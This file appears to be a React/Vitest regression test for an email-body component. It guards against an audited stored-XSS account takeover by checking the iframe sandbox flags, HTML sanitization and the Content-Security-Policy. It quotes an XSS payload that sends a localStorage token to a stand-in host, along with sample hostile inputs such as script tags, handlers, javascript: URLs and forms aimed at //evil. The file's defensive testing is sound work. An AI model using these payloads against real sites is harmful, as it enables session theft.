/**
 * Regression guard for the project's most severe finding (PROJECT_AUDIT §P0-1):
 * stored XSS → account takeover.
 *
 * Inbound Gmail HTML was stored verbatim and rendered with
 * `sandbox="allow-scripts allow-same-origin"`. Those two flags together void
 * the sandbox, and the JWT lived in localStorage — so any stranger who knew a
 * connected mailbox address could send
 *   <img src=x onerror="fetch('//evil/?t='+localStorage.token)">
 * and take the session of whoever opened the resulting task.
 *
 * These tests assert the two independent controls that close it: the sandbox
 * flags, and the DOMPurify pass. Either alone would be enough; both are
 * required to stay.
 *
 * The sandbox assertions were relaxed from "never allow-same-origin" to the
 * invariant that actually closes the hole: NEVER allow-scripts, and never the
 * two together. allow-same-origin was added deliberately, because without it
 * the parent cannot measure the frame and every email rendered at a fixed
 * height with its own scrollbar. Per the HTML sandbox rules allow-same-origin
 * does not enable scripting, and the takeover payload needs scripting to run —
 * so the attack stays dead. See the comment on the iframe in EmailBody.jsx.
 */
import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { EmailBody, buildDocument, hasRemoteImages } from './EmailBody'

/** The exact payload from the audit. */
const TAKEOVER_PAYLOAD = `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">`

const getFrame = () => screen.getByTitle('Email message')

describe('EmailBody — iframe sandbox', () => {
  it('never grants allow-scripts — the flag the takeover needed', () => {
    render(<EmailBody html="<p>hello</p>" title="Email message" />)

    const sandbox = getFrame().getAttribute('sandbox')

    // The exact set, so ANY addition has to come through this test.
    expect(sandbox).toBe('allow-same-origin allow-popups allow-popups-to-escape-sandbox')
    expect(sandbox).not.toContain('allow-scripts')
  })

  it('never grants allow-scripts and allow-same-origin together', () => {
    render(<EmailBody html="<p>hello</p>" title="Email message" />)

    const sandbox = getFrame().getAttribute('sandbox')
    const scripts = sandbox.includes('allow-scripts')
    const sameOrigin = sandbox.includes('allow-same-origin')

    // That pair voids the sandbox entirely. It is the audit's P0-1.
    expect(scripts && sameOrigin).toBe(false)
  })

  it('keeps the sandbox locked down even for hostile input', () => {
    render(<EmailBody html={TAKEOVER_PAYLOAD} title="Email message" />)

    const sandbox = getFrame().getAttribute('sandbox')
    expect(sandbox).not.toContain('allow-scripts')
    // Scripting stays off, so the onerror in the payload can never fire.
    expect(sandbox.includes('allow-scripts') && sandbox.includes('allow-same-origin')).toBe(false)
  })

  it('does not leak the parent origin via referrer', () => {
    render(<EmailBody html="<p>hi</p>" title="Email message" />)
    expect(getFrame()).toHaveAttribute('referrerpolicy', 'no-referrer')
  })
})

describe('EmailBody — sanitization', () => {
  it('strips the onerror handler from the account-takeover payload', () => {
    const doc = buildDocument(TAKEOVER_PAYLOAD)

    expect(doc).not.toContain('onerror')
    expect(doc).not.toContain('localStorage')
    expect(doc).not.toContain('evil')
  })

  // NB: assert on element/attribute syntax, not bare words. The document embeds
  // a CSP meta tag containing `script-src 'none'`, so a naive
  // `not.toContain('script')` fails on the very control that makes it safe.
  it.each([
    ['script tags', '<script>window.stolen = 1</script><p>ok</p>', '<script'],
    ['script payloads', '<script>window.stolen = 1</script><p>ok</p>', 'window.stolen'],
    ['inline handlers', '<div onclick="steal()">click</div>', 'onclick='],
    ['onload handlers', '<body onload="steal()"><p>x</p></body>', 'onload='],
    ['javascript: URLs', '<a href="javascript:steal()">go</a>', 'javascript:'],
    ['form exfiltration', '<form action="//evil"><input name="t"></form>', '<form'],
    ['nested iframes', '<iframe src="//evil"></iframe>', '<iframe'],
    ['object embeds', '<object data="//evil"></object>', '<object'],
  ])('removes %s', (_label, dirty, forbidden) => {
    expect(buildDocument(dirty).toLowerCase()).not.toContain(forbidden.toLowerCase())
  })

  it('preserves legitimate formatting so real mail still reads correctly', () => {
    const doc = buildDocument('<p>Hello <strong>team</strong></p><table><tr><td>cell</td></tr></table>')

    expect(doc).toContain('<strong>')
    expect(doc).toContain('Hello')
    expect(doc).toContain('cell')
  })

  it('ships a restrictive inline CSP that disables script execution', () => {
    const doc = buildDocument('<p>hi</p>')

    expect(doc).toContain('Content-Security-Policy')
    expect(doc).toContain("script-src 'none'")
  })
})

describe('EmailBody — remote image gating', () => {
  it('detects remote images', () => {
    expect(hasRemoteImages('<img src="https://tracker.example/pixel.gif">')).toBe(true)
    expect(hasRemoteImages('<p>no images here</p>')).toBe(false)
  })

  /*
   * Blocking is enforced by the CSP, not by rewriting the markup: the URL stays
   * in the document but `img-src 'none'` stops the browser fetching it, so no
   * tracking pixel fires. Assert the directive, since that is the actual
   * control — checking for the absence of the hostname would pass only by
   * accident of implementation.
   */
  const imgSrcDirective = (doc) => doc.match(/img-src ([^;"]+)/i)?.[1]?.trim()

  it("blocks remote images by default via img-src 'none'", () => {
    expect(imgSrcDirective(buildDocument('<img src="https://tracker.example/pixel.gif">'))).toBe("'none'")
  })

  it('relaxes img-src only when explicitly opted in', () => {
    const directive = imgSrcDirective(
      buildDocument('<img src="https://tracker.example/pixel.gif">', { allowRemoteImages: true })
    )

    expect(directive).not.toBe("'none'")
    expect(directive).toMatch(/https:/)
  })

  it('still forbids scripts even when images are allowed', () => {
    const doc = buildDocument('<img src="https://x.example/a.gif">', { allowRemoteImages: true })

    expect(doc).toContain("script-src 'none'")
  })
})
